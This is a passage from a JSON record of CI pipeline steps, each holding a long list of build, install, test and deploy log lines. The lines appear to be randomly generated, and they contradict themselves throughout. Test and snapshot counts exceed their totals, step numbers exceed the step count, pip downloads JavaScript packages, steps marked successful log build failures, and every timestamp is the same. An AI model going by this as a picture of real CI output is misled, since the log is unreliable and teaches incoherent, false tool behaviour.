          "Bundling main.js",
          "Artifact downloaded: 19MB",
          "npm notice: created a lockfile",
          "Fetching from https://docker.io/package.json",
          "Compiling lib/utils.go...",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:46:48] INFO: Starting build process",
          "Layer 9/11: RUN command",
          "\u2717 build failed with exit code 111",
          "Waiting...",
          "Connection established",
          "[12:46:48] ERROR: Connection failed",
          "Loading...",
          "\u2713 Task completed in 3887ms",
          "HEAD is now at 816f34e",
          "[12:46:48] DEBUG: Query executed in 27ms",
          "Step 12/23: Deploying",
          "Generating source maps...",
          "GET /api - 200 (17ms)",
          "Finished.",
          "TLS handshake completed",
          "npm install: resolved 267 packages",
          "[12:46:48] DEBUG: Memory usage: 867MB",
          "Minifying main.js",
          "Compiling src/service.java...",
          "npm notice: package.json updated",
          "OK",
          "npm install: resolved 777 packages",
          "Pulling image: node:3.11",
          "pip: Downloading webpack-4.3.tar.gz",
          "[12:46:48] INFO: Connecting to database",
          "Transforming 806 files...",
          "NODE_ENV=production",
          "NODE_ENV=test",
          "\u2713 deploy completed",
          "\u2713 All checks passed",
          "[12:46:48] INFO: Starting build process",
          "POST /upload - 202 (417ms)",
          "Already up to date.",
          "Coverage: 74% statements, 77% branches",
          "[12:46:48] INFO: Processing request",
          "Time: 89.506s",
          "[12:46:48] DEBUG: Loading configuration",
          "\u2713 Task completed in 395ms",
          "Cache invalidated: build",
          "[12:46:48] ERROR: Connection failed",
          "Fetching from https://googleapis.com/package.json",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "NODE_ENV=test",
          "HEAD is now at 80f5f92",
          "Loading...",
          "Test Suites: 21 passed, 16 total",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Creating production build...",
          "Snapshots: 0 passed, 13 total",
          "[12:46:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "pip: Installing build dependencies...",
          "Success!",
          "Step 11/22: Deploying",
          "\u2717 build failed with exit code 74",
          "Creating production build...",
          "Tests: 196 passed, 476 total",
          "WARNING: eslint has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "Already up to date.",
          "HEAD is now at 17a24ce",
          "Platform: linux-x64",
          "Done.",
          "Cache hit for key-8982",
          "Fetching submodules...",
          "pip: Downloading express-2.19.tar.gz",
          "Coverage: 88% statements, 87% branches",
          "Step 7/15: Linting",
          "npm notice: created a lockfile",
          "Coverage: 94% statements, 79% branches",
          "FAILED: test_db_connect",
          "Already up to date.",
          "Ran 98 tests in 56s",
          "Uploading artifact 'coverage' (50 files)",
          "Step 2/16: Testing",
          "\u2713 Step 'checkout' succeeded",
          "Coverage: 92% statements, 98% branches",
          "OK",
          "[12:46:48] DEBUG: Connection pool: 17 active",
          "Building Docker image...",
          "npm install: added 491 packages",
          "[12:46:48] DEBUG: Initializing service",
          "Layer 10/10: ENV command",
          "Generating source maps...",
          "Ready.",
          "[12:46:48] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Success!",
          "Step 9/21: Testing",
          "WARNING: axios has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: node_modules",
          "Uploading artifact 'build' (49 files)",
          "Artifact downloaded: 6MB",
          "Step 11/17: Linting",
          "Success!",
          "pip: Collecting axios",
          "[12:46:48] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 49",
          "[12:46:48] INFO: Starting build process",
          "Waiting...",
          "[12:46:48] INFO: Starting build process",
          "Cache invalidated: build",
          "Tests: 323 passed, 299 total",
          "[12:46:48] DEBUG: Query executed in 80ms",
          "[12:46:48] DEBUG: Connection pool: 17 active",
          "HEAD is now at de268d7",
          "Minifying vendor.js",
          "[12:46:48] WARN: Deprecated API usage",
          "[12:46:48] DEBUG: Memory usage: 726MB",
          "TLS handshake completed",
          "Cache restored successfully (299MB)",
          "Step 17/20: Deploying",
          "Compiling lib/app.ts...",
          "Layer 8/13: COPY command",
          "pip: Downloading eslint-5.0.tar.gz",
          "GET /status - 204 (97ms)",
          "Installing react@1.3.2",
          "Artifact uploaded: dist.zip (9MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Fetching submodules...",
          "Bundling runtime.js",
          "Using Python 3.9",
          "Cache miss for key-5350",
          "Ran 52 tests in 54s",
          "pip install: Successfully installed express-4.5",
          "[12:46:48] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Cache hit for key-7136",
          "Artifact uploaded: dist.zip (45MB)",
          "HEAD is now at 1e2d451",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 99% statements, 69% branches",
          "Generating source maps...",
          "HEAD is now at dde4b54",
          "  PASS: test_db_connect (462ms)",
          "GET /api - 204 (32ms)",
          "Compiling components/app.ts...",
          "[12:46:48] INFO: Request completed",
          "npm install: resolved 1703 packages",
          "Using Python 3.12",
          "Compiling lib/handler.rs...",
          "Done.",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-18T12:48:08.396504",
        "finished_at": "2025-12-18T12:48:15.333139",
        "log_lines": [
          "=== Step: checkout ===",
          "Cache invalidated: node_modules",
          "Cache hit for key-1727",
          "Cache hit for key-1958",
          "Fetching submodules...",
          "WARNING: eslint has known vulnerabilities",
          "Coverage: 81% statements, 98% branches",
          "pip: Collecting express",
          "Cache invalidated: node_modules",
          "[12:46:48] INFO: Connecting to database",
          "GET /api - 201 (64ms)",
          "npm install: added 389 packages",
          "Uploading artifact 'dist' (47 files)",
          "[12:46:48] INFO: Processing request",
          "Layer 4/10: RUN command",
          "Finished.",
          "Pushing to registry...",
          "Verifying...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:48] ERROR: Connection failed",
          "Pulling image: alpine:latest",
          "Switched to branch 'hotfix/task-602'",
          "Cache saved successfully",
          "Cache restored successfully (230MB)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Verifying...",
          "Waiting...",
          "Transforming 683 files...",
          "Success!",
          "npm notice: package.json updated",
          "[12:46:48] WARN: Deprecated API usage",
          "Artifact downloaded: 45MB",
          "Loading...",
          "Step 2/25: Deploying",
          "npm install: resolved 664 packages",
          "npm install: resolved 1756 packages",
          "GET /health - 200 (20ms)",
          "Finished.",
          "pip: Installing build dependencies...",
          "\u2713 All checks passed",
          "Layer 3/9: RUN command",
          "  PASS: e2e/test_db_connect.spec.js",
          "pip: Collecting prettier",
          "  PASS: integration/test_db_connect.spec.js",
          "Success!",
          "[12:46:48] DEBUG: Loading configuration",
          "Image pulled successfully",
          "npm notice: created a lockfile",
          "npm notice: created a lockfile",
          "NODE_ENV=development",
          "HEAD is now at 1d1836e",
          "Already up to date.",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=development",
          "Already up to date.",
          "[12:46:48] WARN: Deprecated API usage",
          "Finished.",
          "Snapshots: 32 passed, 36 total",
          "Checking out main branch",
          "Already up to date.",
          "\u2713 Task completed in 2947ms",
          "npm notice: package.json updated",
          "OK",
          "Using Node.js 20.3.10",
          "[12:46:48] WARN: Deprecated API usage",
          "Compiling components/handler.rs...",
          "Compiling src/handler.rs...",
          "\u2713 All checks passed",
          "[12:46:48] DEBUG: Query executed in 99ms",
          "Bundling runtime.js",
          "Transforming 566 files...",
          "Minifying vendor.js",
          "Step 8/22: Linting",
          "Verifying...",
          "Completed.",
          "Optimizing 12 modules...",
          "Step 11/22: Linting",
          "NODE_ENV=test",
          "Completed.",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 Task completed in 2431ms",
          "HEAD is now at d8a69a3",
          "Verifying...",
          "Tests: 352 passed, 169 total",
          "Loading...",
          "[12:46:48] DEBUG: Initializing service",
          "\u2713 Step 'setup' succeeded",
          "yarn add: Done in 9.2s",
          "\u2717 build failed with exit code 91",
          "Compiling lib/handler.rs...",
          "OK",
          "Compiling utils/utils.go...",
          "Verifying...",
          "Coverage: 83% statements, 87% branches",
          "Pushing to registry...",
          "Step 15/17: Installing dependencies",
          "Time: 36.278s",
          "Step 1/21: Linting",
          "pip: Downloading prettier-5.6.tar.gz",
          "Fetching submodules...",
          "[12:46:48] DEBUG: Connection pool: 3 active",
          "Cache hit for key-1732",
          "npm install: resolved 894 packages",
          "[12:46:48] DEBUG: Loading configuration",
          "Loading...",
          "npm notice: created a lockfile",
          "Success!",
          "Cache restored successfully (288MB)",
          "FAILED: test_db_connect",
          "Step 9/17: Testing",
          "Tests: 176 passed, 224 total",
          "Installing lodash@1.18.10",
          "[12:46:48] WARN: Deprecated API usage",
          "Snapshots: 13 passed, 2 total",
          "Loading...",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "Verifying...",
          "pip: Collecting webpack",
          "  PASS: test_api_health (309ms)",
          "GET /api - 201 (86ms)",
          "pip: Collecting eslint",
          "Cache invalidated: build",
          "Using Node.js 17.14.10",
          "npm install: resolved 1192 packages",
          "Completed.",
          "Layer 10/11: ENV command",
          "Cache miss for key-8194",
          "Using Node.js 16.9.4",
          "Checking out develop branch",
          "Compiling components/handler.rs...",
          "Success!",
          "npm notice: package.json updated",
          "HEAD is now at db79efd",
          "Step 9/15: Building",
          "Connection established",
          "Already up to date.",
          "Uploading artifact 'dist' (38 files)",
          "pip install: Successfully installed webpack-4.15",
          "[12:46:48] DEBUG: Initializing service",
          "Verifying...",
          "\u2713 Task completed in 1051ms",
          "Step 10/22: Building",
          "Cache restored successfully (457MB)",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=development",
          "Waiting...",
          "Creating production build...",
          "Finished.",
          "Step 10/16: Installing dependencies",
          "Step 4/18: Installing dependencies",
          "GET /api - 200 (65ms)",
          "\u2713 Task completed in 1689ms",
          "Waiting...",
          "Environment: development",
          "Waiting...",
          "Uploading artifact 'build' (24 files)",
          "Time: 28.673s",
          "Cache restored successfully (385MB)",
          "FAILED: test_auth_login",
          "Ran 152 tests in 7s",
          "\u2713 All checks passed",
          "Environment: development",
          "\u2713 Step 'test' succeeded",
          "Fetching from https://github.com/package.json",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-18T12:48:15.333139",
        "finished_at": "2025-12-18T12:48:32.674727",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Already up to date.",
          "[12:46:48] WARN: Deprecated API usage",
          "[12:46:48] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:48] ERROR: Connection failed",
          "Finished.",
          "\u2713 test completed",
          "POST /upload - 201 (132ms)",
          "[12:46:48] DEBUG: Memory usage: 1818MB",
          "Transforming 536 files...",
          "Creating production build...",
          "[12:46:48] INFO: Processing request",
          "[12:46:48] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "NODE_ENV=test",
          "Cache saved successfully",
          "Compiling src/main.py...",
          "npm notice: package.json updated",
          "\u2713 package completed",
          "Optimizing 43 modules...",
          "Bundling vendor.css",
          "pip: Downloading react-3.11.tar.gz",
          "yarn add: Done in 10.62s",
          "pip: Downloading lodash-4.11.tar.gz",
          "Verifying...",
          "Success!",
          "[12:46:48] INFO: Processing request",
          "TLS handshake completed",
          "OK",
          "pip: Collecting axios",
          "Processing...",
          "Cache saved successfully",
          "Fetching submodules...",
          "[12:46:48] INFO: Request completed",
          "\u2713 Step 'test' succeeded",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/utils.go...",
          "Cache restored successfully (313MB)",
          "\u2713 Step 'setup' succeeded",
          "[12:46:48] DEBUG: Query executed in 55ms",
          "Transforming 152 files...",
          "npm notice: package.json updated",
          "[12:46:48] DEBUG: Memory usage: 1136MB",
          "Compiling utils/index.js...",
          "[12:46:48] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Done.",
          "Step 5/18: Testing",
          "Cache invalidated: node_modules",
          "[12:46:48] ERROR: Connection failed",
          "[12:46:48] DEBUG: Initializing service",
          "Ready.",
          "Completed.",
          "[12:46:48] DEBUG: Loading configuration",
          "Tests: 314 passed, 149 total",
          "Pulling image: python:3.11",
          "  PASS: unit/test_user_create.spec.js",
          "Pulling image: python:3.11",
          "\u2713 Task completed in 2994ms",
          "Step 6/21: Building",
          "  PASS: test_auth_login (328ms)",
          "Image pulled successfully",
          "npm install: added 129 packages",
          "npm notice: package.json updated",
          "Step 8/16: Linting",
          "[12:46:48] ERROR: Connection failed",
          "Checking out develop branch",
          "Cache miss for key-3135",
          "npm notice: created a lockfile",
          "\u2713 deploy completed",
          "Creating production build...",
          "[12:46:48] DEBUG: Initializing service",
          "Platform: win32-x64",
          "POST /api - 201 (164ms)",
          "Processing...",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_db_connect (67ms)",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:48] INFO: Starting build process",
          "Cache saved successfully",
          "Cache restored successfully (265MB)",
          "Image pulled successfully",
          "Success!",
          "Step 4/17: Testing",
          "Pushing to registry...",
          "Compiling src/index.js...",
          "Compiling components/handler.rs...",
          "Waiting...",
          "  PASS: unit/test_auth_login.spec.js",
          "Step 1/19: Building",
          "Success!",
          "Optimizing 68 modules...",
          "Pulling image: python:latest",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/utils.go...",
          "Image pulled successfully",
          "Uploading artifact 'coverage' (43 files)",
          "FAILED: test_db_connect",
          "Done.",
          "npm notice: created a lockfile",
          "[12:46:48] ERROR: Connection failed",
          "Building Docker image...",
          "Success!",
          "Optimizing 77 modules...",
          "Using Python 3.10",
          "Artifact downloaded: 50MB",
          "  PASS: integration/test_user_create.spec.js",
          "Verifying...",
          "[12:46:48] INFO: Processing request",
          "Cache miss for key-2053",
          "Building Docker image...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "[12:46:48] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: package.json updated",
          "Pulling image: python:3.11",
          "Coverage: 86% statements, 100% branches",
          "pip install: Successfully installed jest-5.16",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:48] DEBUG: Query executed in 80ms",
          "npm install: added 283 packages",
          "[12:46:48] INFO: Connecting to database",
          "[12:46:48] DEBUG: Loading configuration",
          "GET /status - 204 (48ms)",
          "Verifying...",
          "yarn add: Done in 3.88s",
          "Already up to date.",
          "Environment: development",
          "Loading...",
          "Processing...",
          "[12:46:48] DEBUG: Loading configuration",
          "Step 18/19: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:48] DEBUG: Connection pool: 17 active",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "Fetching from https://npmjs.org/package.json",
          "NODE_ENV=development",
          "Connection established",
          "Already up to date.",
          "Loading...",
          "Done.",
          "[12:46:48] DEBUG: Query executed in 54ms",
          "Checking out master branch",
          "Test Suites: 8 passed, 38 total",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: dist.zip (11MB)",
          "Finished.",
          "[12:46:48] DEBUG: Query executed in 61ms",
          "HEAD is now at da064a1",
          "Bundling main.css",
          "Completed.",
          "Checking out main branch",
          "Step 12/24: Deploying",
          "npm notice: created a lockfile",
          "Using Python 3.9",
          "Pushing to registry...",
          "Creating production build...",
          "Fetching from https://registry.npmjs.org/package.json",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-18T12:48:32.674727",
        "finished_at": "2025-12-18T12:48:39.611362",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Already up to date.",
          "\u2713 Step 'setup' succeeded",
          "Minifying vendor.js",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 10/20: Running migrations",
          "Ran 86 tests in 41s",
          "npm install: resolved 1707 packages",
          "\u2713 Step 'build' succeeded",
          "Done.",
          "Success!",
          "Cache miss for key-9088",
          "Checking out develop branch",
          "Connection established",
          "[12:46:48] INFO: Connecting to database",
          "Platform: win32-x64",
          "Tests: 410 passed, 399 total",
          "Generating source maps...",
          "[12:46:48] INFO: Request completed",
          "Compiling src/index.js...",
          "pip: Downloading jest-4.9.tar.gz",
          "Exception: RuntimeError",
          "Installing lodash@1.2.10",
          "OK",
          "Step 3/20: Linting",
          "Artifact downloaded: 24MB",
          "[12:46:48] INFO: Starting build process",
          "HEAD is now at 0035781",
          "Ran 49 tests in 57s",
          "Step 18/16: Deploying",
          "Coverage: 90% statements, 67% branches",
          "Creating production build...",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:48] INFO: Request completed",
          "pip: Collecting axios",
          "\u2713 All checks passed",
          "  PASS: e2e/test_api_health.spec.js",
          "[12:46:48] DEBUG: Connection pool: 4 active",
          "Using Python 3.12",
          "Ran 160 tests in 40s",
          "Bundling vendor.js",
          "Waiting...",
          "\u2713 test completed",
          "[12:46:48] DEBUG: Loading configuration",
          "[12:46:48] ERROR: Connection failed",
          "[12:46:48] ERROR: Connection failed",
          "Uploading artifact 'build' (24 files)",
          "Cache invalidated: dependencies",
          "Artifact uploaded: dist.zip (7MB)",
          "Using Python 3.9",
          "[12:46:48] WARN: Deprecated API usage",
          "WARNING: jest has known vulnerabilities",
          "[12:46:48] DEBUG: Memory usage: 1480MB",
          "WARNING: webpack has known vulnerabilities",
          "Cache miss for key-1395",
          "WARNING: axios has known vulnerabilities",
          "Pushing to registry...",
          "Snapshots: 46 passed, 49 total",
          "[12:46:48] INFO: Starting build process",
          "Cache saved successfully",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "Environment: staging",
          "Verifying...",
          "npm install: added 379 packages",
          "Fetching from https://gcr.io/package.json",
          "\u2713 Task completed in 2464ms",
          "Environment: test",
          "WARNING: prettier has known vulnerabilities",
          "Fetching from https://googleapis.com/package.json",
          "Environment: test",
          "Step 18/24: Running migrations",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Bundling main.js",
          "[12:46:48] WARN: Deprecated API usage",
          "POST /data - 200 (124ms)",
          "npm install: resolved 1931 packages",
          "TLS handshake completed",
          "Environment: development",
          "Success!",
          "pip: Collecting express",
          "Fetching submodules...",
          "Using Node.js 15.2.4",
          "Already up to date.",
          "Waiting...",
          "Installing eslint@3.7.9",
          "Installing prettier@1.14.8",
          "Compiling utils/handler.rs...",
          "Connection established",
          "Success!",
          "[12:46:48] INFO: Connecting to database",
          "Already up to date.",
          "Ready.",
          "Ready.",
          "yarn add: Done in 9.19s",
          "Using Node.js 19.2.1",
          "Bundling main.css",
          "[12:46:48] DEBUG: Query executed in 33ms",
          "Checking out master branch",
          "Step 6/15: Installing dependencies",
          "\u2717 build failed with exit code 89",
          "npm install: resolved 1014 packages",
          "Environment: production",
          "WARNING: webpack has known vulnerabilities",
          "Step 19/22: Testing",
          "Checking out develop branch",
          "Cache restored successfully (476MB)",
          "Generating source maps...",
          "Test Suites: 43 passed, 39 total",
          "Switched to branch 'hotfix/task-913'",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 609 files...",
          "npm install: resolved 1884 packages",
          "Step 15/19: Installing dependencies",
          "Using Python 3.9",
          "yarn add: Done in 24.95s",
          "WARNING: express has known vulnerabilities",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (58MB)",
          "Installing express@3.11.1",
          "[12:46:48] DEBUG: Loading configuration",
          "Processing...",
          "GET /api - 200 (68ms)",
          "Minifying app.js",
          "Time: 100.66s",
          "Generating source maps...",
          "Fetching from https://github.com/package.json",
          "OK",
          "npm notice: created a lockfile",
          "[12:46:48] WARN: Deprecated API usage",
          "npm install: resolved 1783 packages",
          "Completed.",
          "Minifying vendor.js",
          "[12:46:48] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Step 3/15: Linting",
          "[12:46:48] WARN: Deprecated API usage",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Step 3/21: Installing dependencies",
          "Time: 68.702s",
          "Bundling runtime.css",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting express",
          "Transforming 708 files...",
          "Pulling image: python:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "Cache miss for key-5025",
          "  PASS: e2e/test_user_create.spec.js",
          "Ran 83 tests in 6s",
          "pip: Collecting webpack",
          "[12:46:48] DEBUG: Connection pool: 5 active",
          "\u2713 All checks passed",
          "Compiling components/main.py...",
          "[12:46:48] ERROR: Connection failed",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "Compiling lib/handler.rs...",
          "Connection established",
          "Generating source maps...",
          "\u2713 Task completed in 4823ms",
          "Step 12/22: Testing",
          "pip: Downloading eslint-3.1.tar.gz",
          "OK",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-18T12:48:39.611362",
        "finished_at": "2025-12-18T12:48:56.952950",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Building Docker image...",
          "[12:46:48] DEBUG: Memory usage: 617MB",
          "Done.",
          "Success!",
          "POST /data - 202 (438ms)",
          "[12:46:48] INFO: Cache refreshed",
          "Snapshots: 25 passed, 27 total",
          "Loading...",
          "Artifact uploaded: dist.zip (26MB)",
          "[12:46:48] DEBUG: Query executed in 69ms",
          "Cache invalidated: dependencies",
          "yarn add: Done in 21.60s",
          "Layer 5/10: RUN command",
          "pip install: Successfully installed react-5.12",
          "[12:46:48] DEBUG: Query executed in 65ms",
          "[12:46:48] INFO: Request completed",
          "Cache restored successfully (167MB)",
          "  PASS: test_auth_login (15ms)",
          "Layer 5/14: RUN command",
          "[12:46:48] DEBUG: Memory usage: 738MB",
          "Compiling components/index.js...",
          "[12:46:48] WARN: Deprecated API usage",
          "Creating production build...",
          "Step 10/16: Running migrations",
          "FAILED: test_db_connect",
          "Coverage: 89% statements, 93% branches",
          "[12:46:48] INFO: Connecting to database",
          "Checking out main branch",
          "Artifact downloaded: 17MB",
          "Connection established",
          "POST /data - 201 (344ms)",
          "Ready.",
          "Test Suites: 36 passed, 21 total",
          "Verifying...",
          "pip install: Successfully installed react-5.9",
          "Fetching from https://gcr.io/package.json",
          "Pushing to registry...",
          "Cache miss for key-7260",
          "Cache hit for key-2789",
          "pip: Collecting axios",
          "Test Suites: 30 passed, 44 total",
          "Ran 195 tests in 15s",
          "Loading...",
          "Compiling utils/service.java...",
          "GET /api - 200 (19ms)",
          "  PASS: e2e/test_auth_login.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling utils/handler.rs...",
          "npm notice: created a lockfile",
          "[12:46:48] DEBUG: Query executed in 18ms",
          "Waiting...",
          "Cache hit for key-3270",
          "Installing jest@3.5.9",
          "Uploading artifact 'dist' (27 files)",
          "Building Docker image...",
          "Step 8/23: Linting",
          "Completed.",
          "npm notice: created a lockfile",
          "Verifying...",
          "Image pulled successfully",
          "  PASS: e2e/test_cache_hit.spec.js",
          "npm notice: created a lockfile",
          "Bundling styles.css",
          "pip: Collecting webpack",
          "npm notice: package.json updated",
          "Transforming 347 files...",
          "Tests: 93 passed, 352 total",
          "Step 3/23: Running migrations",
          "npm install: added 172 packages",
          "Artifact downloaded: 3MB",
          "Platform: darwin-arm64",
          "Platform: win32-x64",
          "Generating source maps...",
          "Step 15/22: Deploying",
          "Done.",
          "HEAD is now at 7b2002a",
          "Compiling utils/handler.rs...",
          "[12:46:48] DEBUG: Connection pool: 16 active",
          "[12:46:48] INFO: Processing request",
          "Coverage: 94% statements, 81% branches",
          "[12:46:48] DEBUG: Initializing service",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/index.js...",
          "Building Docker image...",
          "Already up to date.",
          "Success!",
          "[12:46:48] INFO: Cache refreshed",
          "NODE_ENV=production",
          "Step 10/21: Running migrations",
          "Pulling image: python:latest",
          "[12:46:48] INFO: Connecting to database",
          "Snapshots: 26 passed, 8 total",
          "yarn add: Done in 6.2s",
          "Connection established",
          "Step 7/18: Testing",
          "npm install: resolved 551 packages",
          "[12:46:48] DEBUG: Memory usage: 1290MB",
          "WARNING: lodash has known vulnerabilities",
          "Cache saved successfully",
          "Layer 2/12: COPY command",
          "Minifying app.js",
          "Cache restored successfully (454MB)",
          "Processing...",
          "Test Suites: 36 passed, 9 total",
          "Compiling components/main.py...",
          "[12:46:48] DEBUG: Query executed in 1ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Python 3.10",
          "Environment: staging",
          "Minifying app.js",
          "yarn add: Done in 23.9s",
          "Artifact uploaded: dist.zip (95MB)",
          "HEAD is now at f18910d",
          "Compiling utils/app.ts...",
          "[12:46:48] WARN: Deprecated API usage",
          "[12:46:48] DEBUG: Initializing service",
          "npm notice: created a lockfile",
          "Tests: 438 passed, 217 total",
          "Loading...",
          "Creating production build...",
          "Uploading artifact 'build' (35 files)",
          "Optimizing 36 modules...",
          "yarn add: Done in 7.8s",
          "Snapshots: 21 passed, 22 total",
          "pip: Collecting react",
          "\u2717 build failed with exit code 55",
          "Generating source maps...",
          "Cache restored successfully (264MB)",
          "WARNING: express has known vulnerabilities",
          "Step 5/15: Testing",
          "pip: Downloading eslint-2.5.tar.gz",
          "Connection established",
          "Snapshots: 28 passed, 18 total",
          "Loading...",
          "[12:46:48] ERROR: Connection failed",
          "Snapshots: 0 passed, 8 total",
          "Loading...",
          "Artifact uploaded: dist.zip (90MB)",
          "Generating source maps...",
          "Cache hit for key-4917",
          "npm install: resolved 963 packages",
          "pip: Collecting axios",
          "[12:46:48] INFO: Starting build process",
          "Connection established",
          "HEAD is now at 1e799b1",
          "Coverage: 78% statements, 71% branches",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Step 2/23: Testing",
          "Already up to date.",
          "[12:46:48] DEBUG: Loading configuration",
          "Finished.",
          "Completed.",
          "[12:46:48] DEBUG: Memory usage: 1922MB",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "npm install: resolved 1416 packages",
          "npm install: added 315 packages",
          "npm notice: package.json updated",
          "Step 7/17: Installing dependencies",
          "Pulling image: alpine:latest",
          "[12:46:48] INFO: Connecting to database",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:48] DEBUG: Connection pool: 1 active",
          "yarn add: Done in 28.24s",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-18T12:48:56.952950",
        "finished_at": "2025-12-18T12:49:14.294538",
        "log_lines": [
          "=== Step: setup_node ===",
          "FAILED: test_cache_hit",
          "NODE_ENV=development",
          "Artifact downloaded: 12MB",
          "[12:46:48] INFO: Request completed",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/index.js...",
          "Ran 88 tests in 26s",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-8201",
          "npm install: resolved 874 packages",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Snapshots: 34 passed, 15 total",
          "Cache restored successfully (274MB)",
          "Connection established",
          "Connection established",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Completed.",
          "Minifying main.js",
          "Fetching submodules...",
          "Checking out main branch",
          "\u2713 Step 'setup' succeeded",
          "Fetching submodules...",
          "Completed.",
          "GET /api - 201 (27ms)",
          "  PASS: test_api_health (246ms)",
          "Generating source maps...",
          "pip: Collecting jest",
          "Compiling lib/service.java...",
          "Transforming 549 files...",
          "Compiling components/service.java...",
          "Layer 10/11: ENV command",
          "GET /status - 204 (54ms)",
          "Cache miss for key-5769",
          "[12:46:48] DEBUG: Loading configuration",
          "  PASS: unit/test_db_connect.spec.js",
          "pip: Installing build dependencies...",
          "Transforming 490 files...",
          "FAILED: test_cache_hit",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Python 3.9",
          "Step 9/20: Deploying",
          "Generating source maps...",
          "Uploading artifact 'build' (47 files)",
          "pip: Collecting lodash",
          "Step 17/17: Running migrations",
          "Test Suites: 27 passed, 49 total",
          "Uploading artifact 'coverage' (13 files)",
          "yarn add: Done in 6.80s",
          "Step 8/23: Linting",
          "NODE_ENV=development",
          "OK",
          "NODE_ENV=development",
          "yarn add: Done in 15.69s",
          "Step 17/20: Linting",
          "Minifying app.js",
          "Cache hit for key-5328",
          "Done.",
          "yarn add: Done in 16.31s",
          "pip install: Successfully installed jest-1.4",
          "pip: Downloading lodash-4.16.tar.gz",
          "Creating production build...",
          "Step 2/16: Testing",
          "Already up to date.",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Cache restored successfully (237MB)",
          "[12:46:48] DEBUG: Loading configuration",
          "Finished.",
          "Step 4/23: Linting",
          "GET /api - 201 (77ms)",
          "Step 11/16: Building",
          "Pushing to registry...",
          "Platform: linux-x64",
          "POST /upload - 202 (160ms)",
          "Uploading artifact 'coverage' (2 files)",
          "Coverage: 84% statements, 79% branches",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 8MB",
          "\u2713 All checks passed",
          "Step 18/17: Deploying",
          "Cache restored successfully (320MB)",
          "Exception: RuntimeError",
          "Loading...",
          "\u2713 Task completed in 234ms",
          "[12:46:48] INFO: Connecting to database",
          "Building Docker image...",
          "  PASS: test_api_health (191ms)",
          "HEAD is now at f23144d",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Fetching from https://amazonaws.com/package.json",
          "Completed.",
          "npm install: resolved 1759 packages",
          "NODE_ENV=production",
          "pip: Collecting eslint",
          "Step 17/17: Running migrations",
